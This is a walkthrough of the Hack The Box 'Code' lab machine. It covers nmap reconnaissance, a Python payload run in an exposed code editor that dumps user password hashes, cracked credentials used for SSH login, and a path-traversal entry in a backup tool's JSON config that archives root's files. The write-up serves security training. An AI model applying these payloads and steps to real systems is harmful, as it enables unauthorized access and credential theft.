# Code Write-up

<img src="https://labs.hackthebox.com/storage/avatars/55cc3528cd7ad96f67c4f0c715efe286.png" width="200" height="200">

## Recon 

### Port enumeration with NMap

`nmap -sC -sV 10.10.11.62`

    PORT     STATE    SERVICE   VERSION
    22/tcp   open     ssh       OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
    |   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
    |_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
    5000/tcp open     http      Gunicorn 20.0.4
    |_http-title: Python Code Editor
    |_http-server-header: gunicorn/20.0.4
    9898/tcp filtered monkeycom
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## Exploitation 

We can see that port 5000 is running a Python Code Editor.

![image](https://github.com/user-attachments/assets/64329268-39d2-469b-9b09-134864bc0cc4)

Use payload:

    print([(user.id, user.username, user.password) for user in User.query.all()])

![image](https://github.com/user-attachments/assets/92fb4455-617b-4f0c-9bd8-e3cdc8c175f1)

Credentials:

    development:759b74ce43947f5f4c91aeddc3e5bad3
    
    martin:3de6f30c4a09c27fc71932bfc68474be
    
    1:c4ca4238a0b923820dcc509a6f75849b

We can use CrackStation

![image](https://github.com/user-attachments/assets/a691af07-fe5f-4653-bb4b-b2be4a868b4b)

![image](https://github.com/user-attachments/assets/8df2dc7a-163f-42a2-aae1-966d255f0329)

![image](https://github.com/user-attachments/assets/52502a54-c3a7-4a84-93ee-697ad8a9d519)

Passwords

`development`:`development`

`martin`:`nafeelswordsmaster`

## SSH

![image](https://github.com/user-attachments/assets/771c020d-8b06-43f8-bf6d-1efe1893f457)

![image](https://github.com/user-attachments/assets/0f7458be-8b8f-45ca-b973-4fc1bb80bdda)

![image](https://github.com/user-attachments/assets/ffeca174-7211-4583-a115-87c7ffad4a45)

![image](https://github.com/user-attachments/assets/f7bc8ab2-accc-41ea-8cd2-8d7055ef1ad2)

![image](https://github.com/user-attachments/assets/94b628f7-6a92-43b6-b553-4402d6d1c567)

    {
    “destination”: “/home/martin/”,
    “multiprocessing”: true,
    “verbose_log”: false,
    “directories_to_archive”: [
    “/home/app-production/user.txt”
    ]
    }

![image](https://github.com/user-attachments/assets/52bc9d84-f57c-4958-a3ab-19840b7022d8)

![image](https://github.com/user-attachments/assets/e037c2e8-6142-43e2-baba-03624b639a41)

![image](https://github.com/user-attachments/assets/d99448ae-4d95-46c1-bdd2-35d05a2221c1)

Get the user flag!

![image](https://github.com/user-attachments/assets/929e6daa-a817-4c99-bba9-8d3634d882ca)

Privilege Escalation

    {
    “destination”: “/home/martin/”,
    “multiprocessing”: true,
    “verbose_log”: true,
    “directories_to_archive”: [
    “/var/….//root/”
    ]
    }

![image](https://github.com/user-attachments/assets/571a91cb-c7f5-4d21-bbd4-4213ed9a6a69)

Get the root flag!

![image](https://github.com/user-attachments/assets/60a4d038-0792-4447-8de9-d619e4781f23)
